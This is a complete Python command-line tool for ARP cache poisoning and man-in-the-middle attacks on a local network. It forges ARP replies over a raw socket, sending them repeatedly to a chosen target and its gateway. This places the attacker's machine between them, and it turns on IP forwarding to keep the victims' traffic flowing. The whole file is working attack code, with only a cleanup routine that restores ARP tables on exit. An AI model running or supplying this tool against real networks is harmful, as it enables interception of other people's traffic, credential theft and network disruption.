#!/usr/bin/env python3
__version__ = "1.1.0"
"""arp cache poisoning and mitm"""

import argparse
import os
import platform
import signal
import socket
import subprocess
import struct
import sys
import time

PLATFORM = platform.system().lower()


def get_mac(ip, iface=None, timeout=2):
    """get mac address for an ip using arp"""
    try:
        if PLATFORM == "windows":
            cmd = ["arp", "-a", ip]
        else:
            cmd = ["arp", "-n", ip]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        for line in result.stdout.split("\n"):
            if ip in line:
                parts = line.split()
                for part in parts:
                    clean = part.replace("-", ":")
                    if ":" in clean and len(clean) == 17:
                        return clean
    except (subprocess.TimeoutExpired, OSError):
        pass
    return None


def get_own_mac(iface="eth0"):
    """get our own mac address"""
    if PLATFORM == "linux":
        try:
            with open(f"/sys/class/net/{iface}/address", "r") as f:
                return f.read().strip()
        except (FileNotFoundError, PermissionError):
            pass
    elif PLATFORM == "darwin":
        try:
            result = subprocess.run(
                ["ifconfig", iface],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.split("\n"):
                if "ether" in line:
                    return line.split("ether")[1].strip().split()[0]
        except (subprocess.TimeoutExpired, OSError):
            pass
    elif PLATFORM == "windows":
        try:
            result = subprocess.run(
                ["getmac", "/v", "/fo", "csv"],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.split("\n"):
                if iface.lower() in line.lower() or "connected" in line.lower():
                    parts = line.split(",")
                    for part in parts:
                        clean = part.strip('"').replace("-", ":")
                        if len(clean) == 17 and ":" in clean:
                            return clean.lower()
        except (subprocess.TimeoutExpired, OSError):
            pass
    return None


def build_arp_packet(src_mac, src_ip, dst_mac, dst_ip, op=2):
    """build a raw arp reply packet"""
    # ethernet header
    dst_mac_bytes = bytes.fromhex(dst_mac.replace(":", ""))
    src_mac_bytes = bytes.fromhex(src_mac.replace(":", ""))
    eth_header = dst_mac_bytes + src_mac_bytes + b"\x08\x06"

    # arp header
    arp_header = struct.pack(
        "!HHBBH",
        1,      # hardware type: ethernet
        0x0800, # protocol type: ipv4
        6,      # hardware size
        4,      # protocol size
        op      # operation: 2=reply
    )

    # arp payload
    src_ip_bytes = socket.inet_aton(src_ip)
    dst_ip_bytes = socket.inet_aton(dst_ip)
    arp_payload = src_mac_bytes + src_ip_bytes + dst_mac_bytes + dst_ip_bytes

    return eth_header + arp_header + arp_payload


def enable_forwarding():
    """enable ip forwarding to maintain connectivity"""
    if PLATFORM == "linux":
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
            return True
        except PermissionError:
            subprocess.run(
                ["sysctl", "-w", "net.ipv4.ip_forward=1"],
                capture_output=True
            )
            return True
        except OSError:
            return False
    elif PLATFORM == "darwin":
        result = subprocess.run(
            ["sysctl", "-w", "net.inet.ip.forwarding=1"],
            capture_output=True
        )
        return result.returncode == 0
    elif PLATFORM == "windows":
        result = subprocess.run(
            ["netsh", "interface", "ipv4", "set", "interface",
             "forwarding=enabled"],
            capture_output=True
        )
        return result.returncode == 0
    return False


def disable_forwarding():
    """disable ip forwarding on cleanup"""
    if PLATFORM == "linux":
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0")
        except (PermissionError, OSError):
            subprocess.run(
                ["sysctl", "-w", "net.ipv4.ip_forward=0"],
                capture_output=True
            )
    elif PLATFORM == "darwin":
        subprocess.run(
            ["sysctl", "-w", "net.inet.ip.forwarding=0"],
            capture_output=True
        )
    elif PLATFORM == "windows":
        subprocess.run(
            ["netsh", "interface", "ipv4", "set", "interface",
             "forwarding=disabled"],
            capture_output=True
        )


def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, iface):
    """send correct arp entries to restore the network"""
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
        sock.bind((iface, 0))

        # restore target's arp cache
        pkt1 = build_arp_packet(gateway_mac, gateway_ip, target_mac, target_ip)
        # restore gateway's arp cache
        pkt2 = build_arp_packet(target_mac, target_ip, gateway_mac, gateway_ip)

        for _ in range(5):
            sock.send(pkt1)
            sock.send(pkt2)
            time.sleep(0.2)

        sock.close()
    except PermissionError:
        print("need root to restore arp tables", file=sys.stderr)


def poison(target_ip, gateway_ip, iface="eth0", interval=2):
    """run arp poisoning attack"""
    our_mac = get_own_mac(iface)
    if not our_mac:
        print(f"could not get mac for {iface}", file=sys.stderr)
        return

    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac:
        print(f"could not resolve mac for target {target_ip}", file=sys.stderr)
        return
    if not gateway_mac:
        print(f"could not resolve mac for gateway {gateway_ip}", file=sys.stderr)
        return

    print(f"target:  {target_ip} ({target_mac})")
    print(f"gateway: {gateway_ip} ({gateway_mac})")
    print(f"us:      {our_mac} on {iface}")
    print()

    if not enable_forwarding():
        print("warning: could not enable ip forwarding", file=sys.stderr)

    running = True

    def cleanup(sig=None, frame=None):
        nonlocal running
        running = False
        print("\nrestoring arp tables...")
        restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, iface)
        disable_forwarding()
        print("done")
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
        sock.bind((iface, 0))
    except PermissionError:
        print("need root to send raw packets", file=sys.stderr)
        return

    # tell target that we are the gateway
    pkt_to_target = build_arp_packet(our_mac, gateway_ip, target_mac, target_ip)
    # tell gateway that we are the target
    pkt_to_gateway = build_arp_packet(our_mac, target_ip, gateway_mac, gateway_ip)

    count = 0
    start_time = time.time()
    print("poisoning... (ctrl+c to stop)")
    while running:
        sock.send(pkt_to_target)
        sock.send(pkt_to_gateway)
        count += 1
        if count % 10 == 0:
            elapsed = time.time() - start_time
            rate = (count * 2) / elapsed if elapsed > 0 else 0
            print(f"  packets: {count * 2}  "
                  f"elapsed: {elapsed:.0f}s  "
                  f"rate: {rate:.1f} pkt/s", end="\r")
        time.sleep(interval)

    elapsed = time.time() - start_time
    print(f"\ntotal: {count * 2} packets in {elapsed:.1f}s")


def _default_interface():
    """detect default network interface for the platform"""
    if PLATFORM == "linux":
        try:
            result = subprocess.run(
                ["ip", "route", "show", "default"],
                capture_output=True, text=True, timeout=5
            )
            parts = result.stdout.split()
            if "dev" in parts:
                return parts[parts.index("dev") + 1]
        except (subprocess.TimeoutExpired, OSError):
            pass
        return "eth0"
    elif PLATFORM == "darwin":
        try:
            result = subprocess.run(
                ["route", "-n", "get", "default"],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.split("\n"):
                if "interface:" in line:
                    return line.split("interface:")[1].strip()
        except (subprocess.TimeoutExpired, OSError):
            pass
        return "en0"
    return "eth0"


def show_arp_table():
    """display current arp table as default action"""
    print("arp cache poisoning tool")
    print("usage: poison.py <target_ip> <gateway_ip> [-i interface]")
    print("\ncurrent arp table:\n")
    try:
        if PLATFORM == "windows":
            cmd = ["arp", "-a"]
        elif PLATFORM == "darwin":
            cmd = ["arp", "-a"]
        else:
            cmd = ["arp", "-n"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        print(result.stdout.strip() or "  (empty)")
    except (subprocess.TimeoutExpired, OSError):
        print("  could not read arp table")
    print("\nnote: actual poisoning requires explicit target and gateway args")


def _check_root():
    """check for root/admin privileges across platforms"""
    if PLATFORM == "windows":
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except (ImportError, AttributeError):
            return False
    return os.geteuid() == 0


def main():
    parser = argparse.ArgumentParser(description="arp cache poisoning")
    parser.add_argument("target", nargs="?", default=None, help="target ip")
    parser.add_argument("gateway", nargs="?", default=None, help="gateway ip")
    parser.add_argument("-i", "--interface", default=None,
                        help="network interface")
    parser.add_argument("--interval", type=float, default=2,
                        help="poison interval in seconds (default: 2)")

    args = parser.parse_args()

    if not args.target or not args.gateway:
        show_arp_table()
        return

    if not _check_root():
        print("must run as root/admin", file=sys.stderr)
        sys.exit(1)

    iface = args.interface or _default_interface()

    if PLATFORM != "linux":
        print(f"warning: raw arp spoofing requires AF_PACKET (linux only)",
              file=sys.stderr)
        print("on other platforms, consider using a tool like ettercap",
              file=sys.stderr)
        sys.exit(1)

    poison(args.target, args.gateway, iface, args.interval)


if __name__ == "__main__":
    main()
